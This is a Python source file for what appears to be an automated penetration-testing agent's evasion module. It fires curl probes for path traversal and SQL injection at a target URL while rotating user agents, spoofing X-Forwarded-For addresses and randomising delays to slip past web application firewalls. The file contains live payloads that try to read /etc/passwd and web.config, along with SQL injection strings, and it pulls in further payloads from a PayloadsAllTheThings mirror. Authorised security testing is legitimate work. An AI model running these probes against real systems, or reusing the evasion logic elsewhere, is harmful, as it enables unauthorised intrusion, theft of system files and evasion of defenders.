import random
import time

from app.tools.utils import normalize_domain_for_memory, SENSITIVE_CONTENT_INDICATORS
from app.tools.payloads import fetch_intruder_payloads

class EvasionService:
    """Performs targeted, WAF-evasive probes for SQLi and Path Traversal."""

    def __init__(self, runner, memory):
        """Set up the probe with its command runner, memory sink, and a
        pool of user-agent strings to rotate through for stealth headers.

        Args:
            runner: Object with a `run(command, timeout=None)` method
                (shared CommandRunner).
            memory: ArgusMemory-like object with an `add_finding(...)`
                method, used to record confirmed findings.
        """
        self.runner = runner
        self.memory = memory
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.98 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]

    def _get_stealth_headers(self):
        """Build curl `-H` flags with a random User-Agent and a spoofed
        X-Forwarded-For IP, to vary the fingerprint of each probe.

        Returns:
            str: A string of `-H '...'` flags ready to splice into a curl
            command.
        """
        ua = random.choice(self.user_agents)
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return f"-H 'User-Agent: {ua}' -H 'X-Forwarded-For: {ip}'"

    def stealth_run(self, command, delay=True, timeout=20):
        """Executes a command (typically curl) with stealth headers and optional delay.

        `timeout` defaults to 20s (not command_runner's generic 180s) because
        every caller here is a single curl probe, not a full tool scan - six
        of these run sequentially in advanced_vuln_probe(), so a generous
        per-call timeout can stack up to consume the whole exploit-node
        budget (scripts/run_agent.py's AGENT_TIMEOUT_SECONDS) on its own.

        Args:
            command (str): The command to run - stealth headers are only
                added when it contains "curl ".
            delay (bool): If True, sleep a random 1-3s before running, to
                avoid a suspiciously regular request cadence.
            timeout (int): Seconds to allow the command to run.

        Returns:
            str: The underlying runner's output for `command`.
        """
        if delay:
            time.sleep(random.uniform(1, 3))

        if "curl " in command:
            headers = self._get_stealth_headers()
            command = command.replace("curl ", f"curl {headers} ")

        return self.runner.run(command, timeout=timeout)

    def advanced_vuln_probe(self, url):
        """Performs targeted, WAF-evasive probes for SQLi and Path Traversal.

        Verifies against real response content (`SENSITIVE_CONTENT_INDICATORS`),
        not HTTP status alone - a bare "200" or "500" proves nothing about
        *what* came back (a WAF challenge page or a normal error page can
        return either), so the original status-only check both missed real
        findings and could false-positive on an unrelated 200. Traversal
        payloads cover Linux targets (`/etc/passwd` - what most real-world
        and training-lab traversal vulnerabilities, e.g. PortSwigger's
        labs, actually test for) as well as the original Windows/IIS-style
        `web.config`, since recon doesn't always confirm the target OS
        before this runs.

        Args:
            url (str): Target URL to probe (a `?item=`/`?id=` query
                parameter is appended per payload).

        Returns:
            str: A formatted report of confirmed findings, or
            "No vulnerabilities detected with advanced evasion probes." if
            none of the traversal/SQLi payloads produced a signal.
        """
        print(f"[*] [Argus-Core] Starting Advanced Evasion Probes for: {url}")
        results = []
        clean_target = normalize_domain_for_memory(url)

        # 1. Path Traversal Evasion
        # --max-time/--connect-timeout let curl itself enforce the bound
        # (more reliable than only relying on the outer process being
        # killed - see command_runner.py's own timeout handling).
        traversal_payloads = [
            "../../../../etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//etc/passwd",
            "web.config",
            "..%2f..%2fweb.config",
            "..%5c..%5cweb.config",
        ]
        # Diversify beyond this small static list with real payloads pulled
        # from the local PayloadsAllTheThings mirror (deduplicated - a
        # random sample can coincidentally repeat one already listed above).
        traversal_payloads += [
            p for p in fetch_intruder_payloads(self.runner, "path_traversal")
            if p not in traversal_payloads
        ]
        for p in traversal_payloads:
            cmd = f"curl -s --max-time 15 --connect-timeout 5 '{url}?item={p}'"
            body = self.stealth_run(cmd)
            for indicator, summary in SENSITIVE_CONTENT_INDICATORS.items():
                if indicator in body:
                    results.append(f"[!] Path Traversal Success ({p}): {summary}")
                    self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", summary)
                    break

        # 2. SQLi WAF Evasion
        # A 500 alone is still checked (a real signal on its own), but now
        # also checks the body for actual SQL-error text - some targets
        # return 200 with a visible DB error instead of a 500.
        sqli_error_signatures = (
            "sql syntax", "mysql_fetch", "unclosed quotation mark",
            "odbc drivers error", "sqlite3.operationalerror", "pg_query",
        )
        sqli_payloads = ["%u0027", "1'/**/OR/**/1=1/**/--", "1%20OR%201=1"]
        sqli_payloads += [
            p for p in fetch_intruder_payloads(self.runner, "sqli")
            if p not in sqli_payloads
        ]
        for p in sqli_payloads:
            cmd = f"curl -s --max-time 15 --connect-timeout 5 -w '\\n%{{http_code}}' '{url}?id={p}'"
            res = self.stealth_run(cmd)
            body, _, code = res.rpartition("\n")
            if code == "500":
                results.append(f"[!] Potential SQLi (Evasion): {p} (Server Error 500)")
                self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"SQLi: {p}", "SQLi potential via WAF evasion")
            elif any(sig in body.lower() for sig in sqli_error_signatures):
                results.append(f"[!] Potential SQLi (Evasion): {p} (SQL error signature in response body)")
                self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"SQLi: {p}", "SQLi potential via WAF evasion")

        if not results:
            return "No vulnerabilities detected with advanced evasion probes."

        return "--- [SHIELD] ADVANCED EVASION PROBE REPORT ---\n" + "\n".join(results)
